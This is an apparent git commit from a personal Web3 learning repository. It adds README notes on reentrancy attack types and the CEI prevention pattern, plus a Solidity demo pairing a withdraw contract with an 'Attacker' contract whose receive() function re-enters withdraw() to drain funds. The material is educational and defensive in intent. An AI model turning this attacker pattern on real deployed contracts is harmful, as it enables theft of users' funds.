bb3385929ffe033ba2412f7840ff2ad9c2b4b214
Chirag-Jani <chirag.jani@uniqualitech.com>
2023-09-23 23:47:32 +0530

    feat: day 1 reentrancy attacks

--- README.md
+++ README.md
@@ -1,1 +1,13 @@
 # 100-days-web3
+
+### Reentrancy
+  - Different Types of Reentrancy Attacks
+    - Classic Reentrancy
+    - Cross Functional
+    - Cross Contract
+    - Read Only
+  - Prevention?
+    - Follow CEI patterns while writing functions
+    - Checks: Require Statements
+    - Effects: Update all the necessary variables
+    - Interactions: External calls should me made at the end
---
+++ Reentrancy/Classic.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+contract Vulnurable {
+    mapping (address user => uint funds) balances;
+
+    function deposite() public payable {
+        require(msg.value < 2 ether);
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint amt = balances[msg.sender];
+        balances[msg.sender] = 0; // if done here, re-entry not possible
+        
+        (bool sent, ) = payable (msg.sender).call{value: amt}("");
+        require(sent, "Not enough funds");
+
+        // balances[msg.sender] = 0; if done here, re-entry possible
+
+    }
+}
+
+contract Attacker {
+    address addr;
+
+    function adding(address _addr) public payable {
+        addr = _addr;
+        Vulnurable(addr).deposite{value: msg.value}();
+    }
+    function get() public {
+        Vulnurable(addr).withdraw();
+    }
+
+    receive() external payable {
+        try Vulnurable(addr).withdraw() {} catch {}
+    }
+}
